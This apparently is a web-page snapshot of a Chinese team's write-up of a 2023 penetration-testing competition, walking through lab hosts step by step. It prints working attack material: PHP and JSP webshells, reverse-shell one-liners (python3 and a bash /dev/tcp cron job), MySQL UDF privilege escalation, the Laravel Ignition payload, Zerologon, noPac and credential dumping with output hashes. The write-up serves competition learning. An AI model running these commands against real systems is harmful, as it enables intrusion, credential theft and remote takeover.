@@ -1,0 +1,499 @@
+- generic [active] [ref=f13e1]:
+  - banner [ref=f13e2]:
+    - generic [ref=f13e3]:
+      - link "su-team su-team" [ref=f13e4] [cursor=pointer]:
+        - /url: /
+        - img "su-team" [ref=f13e5]
+        - generic [ref=f13e6]: su-team
+      - generic [ref=f13e7]:
+        - button "Toggle theme" [ref=f13e8] [cursor=pointer]
+        - button "Toggle menu" [ref=f13e17] [cursor=pointer]
+  - main [ref=f13e21]:
+    - article [ref=f13e22]:
+      - generic [ref=f13e24]:
+        - generic [ref=f13e25]:
+          - generic [ref=f13e26]:
+            - time [ref=f13e27]: August 24, 2023
+            - generic [ref=f13e28]: ·
+            - generic [ref=f13e29]: 5 min read
+            - generic [ref=f13e30]: ·
+            - generic [ref=f13e31]: 932 words
+          - link "渗透" [ref=f13e32] [cursor=pointer]:
+            - /url: http://localhost:1313/tags/%E6%B8%97%E9%80%8F/
+        - heading "2023 贵阳大数据网络安全精英对抗赛 SU Writeup" [level=1] [ref=f13e33]
+      - generic [ref=f13e34]:
+        - generic [ref=f13e35]:
+          - paragraph [ref=f13e36]: 本次比赛分为2天渗透，比赛时间为5月17日和5月18日，我们取得了 4th 的好成绩，因为很多是赛后复现加上渗透比赛没啥附件，所以有一些内容会有一些差异。
+          - heading "2023 05 17 day1" [level=2] [ref=f13e37]
+          - heading "1、DMZ区" [level=2] [ref=f13e38]
+          - heading "入口1：172.30.38.150:80 bluecms" [level=3] [ref=f13e39]
+          - paragraph [ref=f13e40]: bluecms后台：http://172.30.38.150/admin/ 账号密码 admin admin666 后台系统管理->模板管理处获编译htm文件，修改为php，burp包如下
+          - generic [ref=f13e41]:
+            - code [ref=f13e43]:
+              - generic [ref=f13e44]: POST /admin/tpl_manage.php HTTP/1.1
+              - generic [ref=f13e46]: "Host: 172.30.38.150"
+              - generic [ref=f13e48]: "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
+              - generic [ref=f13e50]: "Accept-Encoding: gzip, deflate"
+              - generic [ref=f13e52]: "Content-Type: application/x-www-form-urlencoded"
+              - generic [ref=f13e54]: "Content-Length: 108"
+              - generic [ref=f13e56]: "Origin: http://172.30.38.150"
+              - generic [ref=f13e58]: "Connection: close"
+              - generic [ref=f13e60]: "Referer: http://172.30.38.150/admin/tpl_manage.php?act=edit&tpl_name=search.htm"
+              - generic [ref=f13e62]: "Cookie: PHPSESSID=rkiacm3stpb4c9vpj0cp8cfo67"
+              - generic [ref=f13e64]: "Upgrade-Insecure-Requests: 1"
+              - generic [ref=f13e67]: tpl_content=%3C%3Fphp+echo+123%3B%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%3F%3E&tpl_name=../shell.php&act=do_edit
+            - button "Copy code" [ref=f13e69] [cursor=pointer]
+          - paragraph [ref=f13e73]: 获取权限，蚁剑连接，根目录下有flag.txt
+          - generic [ref=f13e74]:
+            - code [ref=f13e76]:
+              - generic [ref=f13e77]: "flag{9130db0c-c67b-4cee-a9a1-a79c34efc079}"
+            - button "Copy code" [ref=f13e79] [cursor=pointer]
+          - paragraph [ref=f13e83]: 同时找/var/www/html/data/config.php看到了关于数据库账号密码相关信息
+          - generic [ref=f13e84]:
+            - code [ref=f13e86]:
+              - generic [ref=f13e87]: $dbhost = "127.0.0.1"; //dmz-db
+              - generic [ref=f13e89]: $dbname = "bluecms";
+              - generic [ref=f13e91]: $dbuser = "root";
+              - generic [ref=f13e93]: $dbpass = "root"; // root-gzdb123
+            - button "Copy code" [ref=f13e95] [cursor=pointer]
+          - paragraph [ref=f13e99]: 但是这里的数据库是本地的，我们第二个靶标与该ip并不是一个，但是既然给了hint，猜测是同一个密码
+          - heading "入口2：172.30.38.151:3306" [level=3] [ref=f13e100]
+          - paragraph [ref=f13e101]:
+            - text: 根据入口1获取的数据库的密码，连接上了数据库，但是数据库中没有数据，尝试提权，试了几种发现udf可以，在国光师傅的博客
+            - link "https://sqlsec.com/udf/" [ref=f13e102] [cursor=pointer]:
+              - /url: https://sqlsec.com/udf/
+            - text: 上复制dll的exp下来，然后执行命令获取权限，整体过程如下 hex太大 这里缩写为0x4d5a900003….
+          - generic [ref=f13e103]:
+            - code [ref=f13e105]:
+              - generic [ref=f13e107]: MySQL [(none)]> select @@plugin_dir;
+              - generic [ref=f13e109]: +----------------------------------------------------+
+              - generic [ref=f13e111]: "| @@plugin_dir |"
+              - generic [ref=f13e113]: +----------------------------------------------------+
+              - generic [ref=f13e115]: "| C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\ |"
+              - generic [ref=f13e117]: +----------------------------------------------------+
+              - generic [ref=f13e119]: 1 row in set (0.003 sec)
+              - generic [ref=f13e122]: MySQL [(none)]> SELECT 0x4d5a900003 INTO DUMPFILE 'C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\\plugin\\udf.dll';
+              - generic [ref=f13e124]: MySQL [(none)]> create function sys_eval returns string soname 'udf.dll';
+              - generic [ref=f13e126]: MySQL [(none)]> select sys_eval("whoami");
+              - generic [ref=f13e128]: +---------------------+
+              - generic [ref=f13e130]: "| sys_eval(\"whoami\") |"
+              - generic [ref=f13e132]: +---------------------+
+              - generic [ref=f13e134]: "| nt authority\\system |"
+              - generic [ref=f13e136]: +---------------------+
+              - generic [ref=f13e138]: 1 row in set (0.042 sec)
+              - generic [ref=f13e140]: 然后一步步翻flag
+              - generic [ref=f13e142]: MySQL [(none)]> select sys_eval('type C:\\users\\Administrator\\Desktop\\flag.txt');
+              - generic [ref=f13e144]: +--------------------------------------------------------------+
+              - generic [ref=f13e146]: "| sys_eval('type C:\\\\users\\\\Administrator\\\\Desktop\\\\flag.txt') |"
+              - generic [ref=f13e148]: +--------------------------------------------------------------+
+              - generic [ref=f13e150]: "| flag{522a6ec2-b101-4bae-b2fd-3e0582096a37 |"
+              - generic [ref=f13e152]: +--------------------------------------------------------------+
+              - generic [ref=f13e154]: 1 row in set (0.030 sec)
+            - button "Copy code" [ref=f13e156] [cursor=pointer]
+          - heading "2、内网区" [level=2] [ref=f13e160]
+          - paragraph [ref=f13e161]: DMZ区拿下了一台linux 一台windows ，选择用linux挂代理
+          - generic [ref=f13e162]:
+            - code [ref=f13e164]:
+              - generic [ref=f13e165]: "linux:"
+              - generic [ref=f13e167]: ./gost -L=socks5://:7777
+              - generic [ref=f13e169]: ./gost -L rtcp://0.0.0.0:8888/localhost:7777 -F forward+ssh://admin:123456@172.30.38.201:9898?ping=30
+              - generic [ref=f13e172]: 本地：
+              - generic [ref=f13e174]: gost-windows-amd64.exe -L forward+ssh://admin:123456@:9898
+              - generic [ref=f13e176]: 本地的8888就是内网区的代理了
+            - button "Copy code" [ref=f13e178] [cursor=pointer]
+          - heading "内网区gitlab:192.168.20.19:8080" [level=3] [ref=f13e182]
+          - paragraph [ref=f13e183]:
+            - text: 先fscan扫描
+            - code [ref=f13e184]: ./fscan -h 192.168.0.0/16
+            - text: 网络有点卡，等了一会发现除了DMZ区外只有一个内网服务器
+          - generic [ref=f13e185]:
+            - code [ref=f13e187]:
+              - generic [ref=f13e188]: 192.168.20.19:8080 open
+              - generic [ref=f13e190]: 192.168.20.19:22 open
+              - generic [ref=f13e192]: "[*] WebTitle:http://192.168.20.19:8080 code:302 len:105 title:None"
+              - generic [ref=f13e194]: "[*] WebTitle:http://192.168.20.19:8080/users/sign_in code:200 len:17 title:Sign in · GitLab"
+              - generic [ref=f13e196]: "[+] InfoScan:http://192.168.20.19:8080/users/sign_in [GitLab]"
+              - generic [ref=f13e198]: "[+] http://192.168.20.19:8080 poc-yaml-gitlab-cnvd-2021-14193-infoleak"
+            - button "Copy code" [ref=f13e200] [cursor=pointer]
+          - paragraph [ref=f13e204]: 网站找gitlab前台rce漏洞，分析了一下，cve-2021-22205可用，github找一个exp打，这里很蛋疼，这个poc是无回显的，而且gitlab不太方便做权限维持（不是php写的），尝试反弹shell，但是内网区是不通本地的ip，只有DMZ区通。 所以我使用的方法是
+          - generic [ref=f13e205]:
+            - code [ref=f13e207]:
+              - generic [ref=f13e208]: 1、先将dmz区的linux反弹shell到本地获取一个交互式dmz区的shell
+              - generic [ref=f13e210]: 这个dmz区反弹一直报错，最后使用python3反弹的
+              - generic [ref=f13e212]: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.10",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+              - generic [ref=f13e214]: 2、在交互式dmz区的shell上 监听nc -lnvp 9090
+              - generic [ref=f13e216]: 3、用gitlab的exp 反弹shell到dmz的ip（192.168.10.10）
+            - button "Copy code" [ref=f13e218] [cursor=pointer]
+          - paragraph [ref=f13e222]: 获取了git的权限，flag在根目录
+          - generic [ref=f13e223]:
+            - code [ref=f13e225]:
+              - generic [ref=f13e226]: git@60783d084846:~/gitlab$ cat /flag.txt
+              - generic [ref=f13e228]: "flag{b10785ca-a4ff-4cb9-a6d5-50351c248ee3}"
+            - button "Copy code" [ref=f13e230] [cursor=pointer]
+          - heading "内网区windows:192.168.20.15" [level=3] [ref=f13e234]
+          - paragraph [ref=f13e235]: fscan开多了，所以没扫到其他资产，试了很久。然后把fscan进程一个个杀了，降低线程+重新跑了一下20+取消ping。 发现了另外一个资产
+          - generic [ref=f13e236]:
+            - code [ref=f13e238]:
+              - generic [ref=f13e239]: 192.168.20.19:22 open
+              - generic [ref=f13e241]: 192.168.20.15:135 open
+              - generic [ref=f13e243]: 192.168.20.15:139 open
+              - generic [ref=f13e245]: 192.168.20.15:445 open
+              - generic [ref=f13e247]: 192.168.20.19:8080 open
+              - generic [ref=f13e249]: 192.168.20.15:88 open
+              - generic [ref=f13e251]: "NetInfo:"
+              - generic [ref=f13e253]: "[*]192.168.20.15"
+              - generic [ref=f13e255]: "[->]DC"
+              - generic [ref=f13e257]: "[->]192.168.20.15"
+              - generic [ref=f13e259]: "[*] 192.168.20.15 (Windows Server 2012 R2 Datacenter 9600)"
+              - generic [ref=f13e261]: "[*] 192.168.20.15 [+]DC COMPANY\\DC Windows Server 2012 R2 Datacenter 9600"
+              - generic [ref=f13e263]: "[*] WebTitle:http://192.168.20.19:8080 code:302 len:105 title:None"
+              - generic [ref=f13e265]: "[*] WebTitle:http://192.168.20.19:8080/users/sign_in code:200 len:17 title:Sign in · GitLab"
+              - generic [ref=f13e267]: "[+] InfoScan:http://192.168.20.19:8080/users/sign_in [GitLab]"
+              - generic [ref=f13e269]: "[+] http://192.168.20.19:8080 poc-yaml-gitlab-cnvd-2021-14193-infoleak"
+            - button "Copy code" [ref=f13e271] [cursor=pointer]
+          - paragraph [ref=f13e275]: 192.168.20.15是一台裸DC 发现存在Zerologon经典漏洞，CVE-2020-1472 先挂上192.168.10.10上的代理，github找一个exp,对着网站复现。 拿到hash用kali的impacket组件，然后用wmiexec命令执行获取flag,所有过程如下
+          - generic [ref=f13e276]:
+            - code [ref=f13e278]:
+              - generic [ref=f13e279]: proxychains4 python3 cve-2020-1472-exploit.py DC 192.168.20.15 1 ⨯
+              - generic [ref=f13e281]: "[proxychains] config file found: /etc/proxychains4.conf"
+              - generic [ref=f13e283]: "[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4"
+              - generic [ref=f13e285]: "[proxychains] DLL init: proxychains-ng 4.14"
+              - generic [ref=f13e287]: Performing authentication attempts...
+              - generic [ref=f13e289]: "[proxychains] Strict chain ... 172.30.38.201:8888 ... 192.168.20.15:135 ... OK"
+              - generic [ref=f13e291]: "[proxychains] Strict chain ... 172.30.38.201:8888 ... 192.168.20.15:49158 ... OK"
+              - generic [ref=f13e293]: ==================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
+              - generic [ref=f13e295]: Target vulnerable, changing account password to empty string
+              - generic [ref=f13e298]: "Result: 0"
+              - generic [ref=f13e301]: Exploit complete!
+              - generic [ref=f13e304]: ─$ proxychains4 python3 secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 "company.local/DC\$@192.168.20.15" 2 ⨯
+              - generic [ref=f13e306]: "[proxychains] config file found: /etc/proxychains4.conf"
+              - generic [ref=f13e308]: "[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4"
+              - generic [ref=f13e310]: "[proxychains] DLL init: proxychains-ng 4.14"
+              - generic [ref=f13e312]: Impacket v0.10.1.dev1 - Copyright 2022 Fortra
+              - generic [ref=f13e315]: "[proxychains] Strict chain ... 172.30.38.201:8888 ... 192.168.20.15:445 ... OK"
+              - generic [ref=f13e317]: "[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied"
+              - generic [ref=f13e319]: "[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)"
+              - generic [ref=f13e321]: "[*] Using the DRSUAPI method to get NTDS.DIT secrets"
+              - generic [ref=f13e323]: "[proxychains] Strict chain ... 172.30.38.201:8888 ... 192.168.20.15:135 ... OK"
+              - generic [ref=f13e325]: "[proxychains] Strict chain ... 172.30.38.201:8888 ... 192.168.20.15:49155 ... OK"
+              - generic [ref=f13e327]: "Administrator:500:aad3b435b51404eeaad3b435b51404ee:c1cd39bfd103a65a50fe6c7199dab799:::"
+              - generic [ref=f13e329]: "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::"
+              - generic [ref=f13e331]: "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:51103e514e91e837821f6c70b2fcbf3a:::"
+              - generic [ref=f13e333]: "DC$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::"
+              - generic [ref=f13e335]: "[*] Kerberos keys grabbed"
+              - generic [ref=f13e337]: krbtgt:aes256-cts-hmac-sha1-96:245e5824adfc248572451cb966eb44fea409149e70713f0b8400069732580b47
+              - generic [ref=f13e339]: krbtgt:aes128-cts-hmac-sha1-96:21fba0c76db699fb80c59730a1bb467c
+              - generic [ref=f13e341]: krbtgt:des-cbc-md5:dace764645ea2646
+              - generic [ref=f13e343]: DC$:aes256-cts-hmac-sha1-96:34c8b93f22c8c95d6c07a1a2bf35dcfae048091233406be6e16f89cdc1865db8
+              - generic [ref=f13e345]: DC$:aes128-cts-hmac-sha1-96:4c0c9af9f667ba964235c2d27b99e3c3
+              - generic [ref=f13e347]: DC$:des-cbc-md5:43d519a4f22ca2a7
+              - generic [ref=f13e349]: "[*] Cleaning up..."
+              - generic [ref=f13e352]: └─$ proxychains4 python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c1cd39bfd103a65a50fe6c7199dab799 company.local/Administrator@192.168.20.15
+              - generic [ref=f13e354]: "[proxychains] config file found: /etc/proxychains4.conf"
+              - generic [ref=f13e356]: "[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4"
+              - generic [ref=f13e358]: "[proxychains] DLL init: proxychains-ng 4.14"
+              - generic [ref=f13e360]: Impacket v0.10.1.dev1 - Copyright 2022 Fortra
+              - generic [ref=f13e363]: "[proxychains] Strict chain ... 172.30.38.201:8888 ... 192.168.20.15:445 ... OK"
+              - generic [ref=f13e365]: "[*] SMBv3.0 dialect used"
+              - generic [ref=f13e367]: "[proxychains] Strict chain ... 172.30.38.201:8888 ... 192.168.20.15:135 ... OK"
+              - generic [ref=f13e369]: "[proxychains] Strict chain ... 172.30.38.201:8888 ... 192.168.20.15:49154 ... OK"
+              - generic [ref=f13e371]: "[!] Launching semi-interactive shell - Careful what you execute"
+              - generic [ref=f13e373]: "[!] Press help for extra shell commands"
+              - generic [ref=f13e375]: C:\>type C:\Users\Administrator\Desktop\flag.txt
+              - generic [ref=f13e377]: "flag{bcbdb15f-fad8-4f18-b9d5-c5ff397bf275}"
+            - button "Copy code" [ref=f13e379] [cursor=pointer]
+          - heading "3、核心内网区" [level=2] [ref=f13e383]
+          - paragraph [ref=f13e384]: 总结前面的信息，在内网区的gitlab上跑fscan，获取扫描核心内网的资产
+          - generic [ref=f13e385]:
+            - code [ref=f13e387]:
+              - generic [ref=f13e388]: git@60783d084846:/tmp/fscan$ ./f -np -h 192.168.30.0/24 -o 30.txt
+              - generic [ref=f13e390]: ./f -np -h 192.168.30.0/24 -o 30.txt
+              - generic [ref=f13e393]: ___ _
+              - generic [ref=f13e395]: / _ \ ___ ___ _ __ __ _ ___| | __
+              - generic [ref=f13e397]: "/ /_\\/____/ __|/ __| '__/ _` |/ __| |/ /"
+              - generic [ref=f13e399]: / /_\\_____\__ \ (__| | | (_| | (__| <
+              - generic [ref=f13e401]: \____/ |___/\___|_| \__,_|\___|_|\_\
+              - generic [ref=f13e403]: "fscan version: 1.6.3"
+              - generic [ref=f13e405]: start infoscan
+              - generic [ref=f13e407]: 192.168.30.19:21 open
+              - generic [ref=f13e409]: 192.168.30.13:80 open
+              - generic [ref=f13e411]: 192.168.30.13:22 open
+              - generic [ref=f13e413]: 192.168.30.19:22 open
+              - generic [ref=f13e416]: "alive ports len is: 4"
+              - generic [ref=f13e418]: start vulscan
+              - generic [ref=f13e420]: "[*] WebTitle:http://192.168.30.13 code:200 len:7 title:Laravel"
+              - generic [ref=f13e422]: "[+] InfoScan:http://192.168.30.13 [Laravel]"
+              - generic [ref=f13e424]: "已完成 1/4 [-] ssh 192.168.30.19:22 root root@2019 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain"
+              - generic [ref=f13e426]: 已完成 3/4 [-] ftp://192.168.30.19:21 www Passw0rd 530 Login incorrect.
+            - button "Copy code" [ref=f13e428] [cursor=pointer]
+          - paragraph [ref=f13e432]: 开了一个web服务器192.168.30.13 是laravel 一个ftp 192.168.30.19是一个ftp。
+          - heading "搭建核心区代理" [level=3] [ref=f13e433]
+          - paragraph [ref=f13e434]: 因为每一层都是单通道，这里尝试把核心区代理到本地，方便对laravel进行渗透，其实这里只要把第二层内网区的网络代理到本地就可以到第三层 搭建代理逻辑如下 1、在第一层DMZ区的192.168.10.10上搭建一个服务器端
+          - generic [ref=f13e435]:
+            - code [ref=f13e437]:
+              - generic [ref=f13e438]: ./gost -L forward+ssh://admin:123456@:17979
+            - button "Copy code" [ref=f13e440] [cursor=pointer]
+          - paragraph [ref=f13e444]: 2、在第二层内网区服务器上起动客户端，让第二层的网络环境到达第一层。
+          - generic [ref=f13e445]:
+            - code [ref=f13e447]:
+              - generic [ref=f13e448]: ./gost -L=socks5://:7777
+              - generic [ref=f13e450]: ./gost -L rtcp://0.0.0.0:7979/localhost:7777 -F forward+ssh://admin:123456@192.168.10.10:17979?ping=30
+            - button "Copy code" [ref=f13e452] [cursor=pointer]
+          - paragraph [ref=f13e456]: 此时在192.168.10.10上执行curl -x socks5://localhost:17979 192.168.30.13 访问正常即可。 结合第一层的代理，然后两层代理一起使用代理链的功能，本地就直接通30了，配置如下
+          - generic [ref=f13e457]:
+            - code [ref=f13e459]:
+              - generic [ref=f13e460]: 127.0.0.1:8888
+              - generic [ref=f13e462]: localhost:7979
+            - button "Copy code" [ref=f13e464] [cursor=pointer]
+          - paragraph [ref=f13e468]: 本地规则为 192.168.30.0/24 走proxychains
+          - 'heading "Laravel : 192.168.30.13" [level=3] [ref=f13e469]'
+          - paragraph [ref=f13e470]:
+            - text: laravel经典漏洞
+            - code [ref=f13e471]: /_ignition/execute-solution debug rce CVE-2021-3129
+            - text: 这个靶场的这个题是今年网鼎决赛-渗透赛道的原题，本人刚好参加并且网鼎决赛现场做出。 ，思路为
+            - code [ref=f13e472]: 任意文件读获取log位置，debug打反序列化rce
+            - text: 任意文件读的接口如下 /api/file
+          - generic [ref=f13e473]:
+            - code [ref=f13e475]:
+              - generic [ref=f13e476]: 一步步读框架文件，读到配置文件
+              - generic [ref=f13e478]: http://192.168.30.13/api/file?filename=/var/www/html/laravel/config/logging.php
+              - generic [ref=f13e480]: 找到日志文件位置logs/tmplog/laravel_log.log
+            - button "Copy code" [ref=f13e482] [cursor=pointer]
+          - paragraph [ref=f13e486]: 直接用网的exp，注意就是把log位置都改一下 例如
+          - generic [ref=f13e487]:
+            - code [ref=f13e489]:
+              - generic [ref=f13e490]: POST /_ignition/execute-solution HTTP/1.1
+              - generic [ref=f13e492]: "Host: 192.168.30.13"
+              - generic [ref=f13e494]: "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0"
+              - generic [ref=f13e496]: "Accept-Encoding: gzip, deflate"
+              - generic [ref=f13e498]: "Accept: */*"
+              - generic [ref=f13e500]: "Connection: close"
+              - generic [ref=f13e502]: "Content-Type: application/json"
+              - generic [ref=f13e504]: "Content-Length: 326"
+              - generic [ref=f13e507]: "{"
+              - generic [ref=f13e509]: "\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\","
+              - generic [ref=f13e511]: "\"parameters\": {"
+              - generic [ref=f13e513]: "\"variableName\": \"username\","
+              - generic [ref=f13e515]: "\"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/tmplog/laravel_log.log\""
+              - generic [ref=f13e517]: "}"
+              - generic [ref=f13e519]: "}"
+            - button "Copy code" [ref=f13e521] [cursor=pointer]
+          - paragraph [ref=f13e525]: 在/var/www/html/laravel/public/写一个木马后可以访问，发现home目录下有flag和hint
+          - generic [ref=f13e526]:
+            - code [ref=f13e528]:
+              - generic [ref=f13e529]: (www-data:/home) $ cat flag.txt
+              - generic [ref=f13e531]: "flag{6855969e-7557-4bf4-9c8c-f5f80ee8e666}"
+              - generic [ref=f13e533]: (www-data:/home) $ cat .hint.txt
+              - generic [ref=f13e535]: "hint:"
+              - generic [ref=f13e537]: "FTP:"
+              - generic [ref=f13e539]: ftpuser
+              - generic [ref=f13e541]: SecretData_xxxx!@#
+              - generic [ref=f13e543]: xxxx is four-digit!
+            - button "Copy code" [ref=f13e545] [cursor=pointer]
+          - paragraph [ref=f13e549]: 这个hint就是下一步用的
+          - 'heading "FTP : 192.168.30.19" [level=3] [ref=f13e550]'
+          - paragraph [ref=f13e551]: 根据上面的提示 ftp密码是SecretData_xxxx!@#， 写一个脚本生成
+          - generic [ref=f13e552]:
+            - code [ref=f13e554]:
+              - generic [ref=f13e555]: "#python exp.py > passwd.txt"
+              - generic [ref=f13e557]: password=""
+              - generic [ref=f13e559]: "for i in range(0,10):"
+              - generic [ref=f13e561]: "for j in range(0,10):"
+              - generic [ref=f13e563]: "for m in range(0,10):"
+              - generic [ref=f13e565]: "for z in range(0,10):"
+              - generic [ref=f13e567]: print('SecretData_' + str(i)+ str(j)+ str(m)+ str(m) + "!@#")
+            - button "Copy code" [ref=f13e569] [cursor=pointer]
+          - paragraph [ref=f13e573]: 用超级弱口令导入用户名ftpuser，密码passwd.txt爆破
+          - generic [ref=f13e574]:
+            - code [ref=f13e576]:
+              - generic [ref=f13e577]: 192.168.30.19----FTP----21----ftpuser----SecretData_7689!@#
+            - button "Copy code" [ref=f13e579] [cursor=pointer]
+          - paragraph [ref=f13e583]:
+            - text: 连接发现有个报错
+            - code [ref=f13e584]: 500 Illegal PORT command. 425 Use PORT or PASV first.
+            - text: 网上找了一下为啥，尝试
+            - code [ref=f13e585]: quote PASV
+            - text: 改成被动模式，用windows的资源管理器打开发现可以复制出来了 获取到flag
+          - generic [ref=f13e586]:
+            - code [ref=f13e588]:
+              - generic [ref=f13e589]: "flag{5923d77e-0765-4701-bc2d-fc1188fe953b}"
+            - button "Copy code" [ref=f13e591] [cursor=pointer]
+          - heading "2023 05 18 day2" [level=1] [ref=f13e595]
+          - heading "DMZ区" [level=2] [ref=f13e596]
+          - heading "Tomcat-RCE" [level=3] [ref=f13e597]
+          - generic [ref=f13e598]:
+            - code [ref=f13e600]:
+              - generic [ref=f13e601]: 弱口令
+              - generic [ref=f13e604]: admin:admin123!@#,有可能记错
+            - button "Copy code" [ref=f13e606] [cursor=pointer]
+          - generic [ref=f13e610]:
+            - code [ref=f13e612]:
+              - generic [ref=f13e613]: <FORM METHOD=GET ACTION='evil.jsp'>
+              - generic [ref=f13e615]: <INPUT name='cmd' type=text>
+              - generic [ref=f13e617]: <INPUT type=submit value='Run'>
+              - generic [ref=f13e619]: </FORM>
+              - generic [ref=f13e621]: <%@ page import="java.io.*" %>
+              - generic [ref=f13e623]: <%
+              - generic [ref=f13e625]: String cmd = request.getParameter("cmd");
+              - generic [ref=f13e627]: String output = "";
+              - generic [ref=f13e629]: "if(cmd != null) {"
+              - generic [ref=f13e631]: String s = null;
+              - generic [ref=f13e633]: "try {"
+              - generic [ref=f13e635]: Process p = Runtime.getRuntime().exec(cmd,null,null);
+              - generic [ref=f13e637]: BufferedReader sI = new BufferedReader(new
+              - generic [ref=f13e639]: InputStreamReader(p.getInputStream()));
+              - generic [ref=f13e641]: "while((s = sI.readLine()) != null) { output += s+\"</br>\"; }"
+              - generic [ref=f13e643]: "} catch(IOException e) { e.printStackTrace(); }"
+              - generic [ref=f13e645]: "}"
+              - generic [ref=f13e647]: "%>"
+              - generic [ref=f13e649]: <pre><%=output %></pre>
+            - button "Copy code" [ref=f13e651] [cursor=pointer]
+          - generic [ref=f13e655]:
+            - code [ref=f13e657]:
+              - generic [ref=f13e658]: "jar -cvf ../webshell.war * # 生成war包上传"
+            - button "Copy code" [ref=f13e660] [cursor=pointer]
+          - generic [ref=f13e664]:
+            - code [ref=f13e666]:
+              - generic [ref=f13e667]: "user1:asd123 #ssh口令"
+              - generic [ref=f13e669]: "# 登陆上去为user1用户需要提权，用户目录下应该有一个poc.c文件，pwnkit提权:CVE-2021-4034"
+              - generic [ref=f13e671]: gcc poc.c -o poc, ./poc
+            - button "Copy code" [ref=f13e673] [cursor=pointer]
+          - heading "内网" [level=2] [ref=f13e677]
+          - heading "docker容器" [level=3] [ref=f13e678]
+          - generic [ref=f13e679]:
+            - code [ref=f13e681]:
+              - generic [ref=f13e682]: "# tomcat进去应该能翻到一个ssh口令"
+              - generic [ref=f13e684]: root:deploy-20231212
+              - generic [ref=f13e687]: "#端口:10022"
+              - generic [ref=f13e689]: 用这个口令去连内网中存在这个端口的服务器，上去是docker容器
+              - generic [ref=f13e692]: "## 特权容器逃逸操作"
+              - generic [ref=f13e694]: "fdisk -l # 查看磁盘文件"
+              - generic [ref=f13e696]: "mkdir /tmp/data #新建临时文件"
+              - generic [ref=f13e698]: "mount /dev/vda1 /tmp/data # 挂着宿主机目录"
+              - generic [ref=f13e700]: "echo '* * * * * bash -i >& /dev/tcp/192.168.3.2/8888 0>&1' >> /tmp/data/var/spool/cron/crontabs/root # 写入定时文件反弹shell"
+              - generic [ref=f13e703]: "## 逃逸成功后，在宿主机上查看另外一个容器,可以发现一个数据库密码"
+              - generic [ref=f13e705]: sa:_H66rCce2psF4D5E8v2B6x3:master
+            - button "Copy code" [ref=f13e707] [cursor=pointer]
+          - heading "SqlServerRCE" [level=3] [ref=f13e711]
+          - generic [ref=f13e712]:
+            - code [ref=f13e714]:
+              - generic [ref=f13e715]: "sa:_H66rCce2psF4D5E8v2B6x3:master # 用户名:密码:数据库"
+            - button "Copy code" [ref=f13e717] [cursor=pointer]
+          - generic [ref=f13e721]:
+            - code [ref=f13e723]:
+              - generic [ref=f13e724]: "# kali中 安装impacket的包, 里面有这个模块"
+              - generic [ref=f13e726]: "impacket-mssqlclient -db master sa:_H66rCce2psF4D5E8v2B6x3@192.168.153.147 #链接远程数据库"
+              - generic [ref=f13e729]: "## 按照工具提示，启动一下xp_cmdshell,就可以执行命令了"
+            - button "Copy code" [ref=f13e731] [cursor=pointer]
+          - heading "核心内网" [level=2] [ref=f13e735]
+          - heading "NoPAC-RCE" [level=3] [ref=f13e736]
+          - generic [ref=f13e737]:
+            - code [ref=f13e739]:
+              - generic [ref=f13e740]: "# 在sqlserver服务器中翻到的账户密码，直接用nopac来打，直接获得一个shell"
+              - generic [ref=f13e742]: python3 ./noPac.py lab.local/test:'1qaz@WSX' -dc-ip 192.168.153.148 -use-ldap -shell --impersonate administrator
+            - button "Copy code" [ref=f13e744] [cursor=pointer]
+          - heading "hash" [level=3] [ref=f13e748]
+          - generic [ref=f13e749]:
+            - code [ref=f13e751]:
+              - generic [ref=f13e752]: "# 打完NoPAC-RCE后, 可以翻到一个密码提示文件"
+              - generic [ref=f13e754]: "# 最终密码为: user:LAB2022!@#_summer"
+              - generic [ref=f13e756]: "# 在终端中输入注意用'\\'来转义一下'!', 返回到hash就能其中一个就是flag, 会有flag字样提示的"
+              - generic [ref=f13e758]: cme smb 192.168.153.149 -u "user" -p "LAB2022\!@#_summer" -M lsassy
+            - button "Copy code" [ref=f13e760] [cursor=pointer]
+        - complementary [ref=f13e764]:
+          - generic [ref=f13e765]:
+            - heading "Table of Contents" [level=4] [ref=f13e766]
+            - navigation [ref=f13e768]:
+              - list [ref=f13e769]:
+                - listitem [ref=f13e770]:
+                  - list [ref=f13e771]:
+                    - listitem [ref=f13e772]:
+                      - link "2023 05 17 day1" [ref=f13e773] [cursor=pointer]:
+                        - /url: "#2023-05-17-day1"
+                    - listitem [ref=f13e774]:
+                      - link "1、DMZ区" [ref=f13e775] [cursor=pointer]:
+                        - /url: "#1dmz区"
+                      - list [ref=f13e776]:
+                        - listitem [ref=f13e777]:
+                          - link "入口1：172.30.38.150:80 bluecms" [ref=f13e778] [cursor=pointer]:
+                            - /url: "#入口1172303815080-bluecms"
+                        - listitem [ref=f13e779]:
+                          - link "入口2：172.30.38.151:3306" [ref=f13e780] [cursor=pointer]:
+                            - /url: "#入口217230381513306"
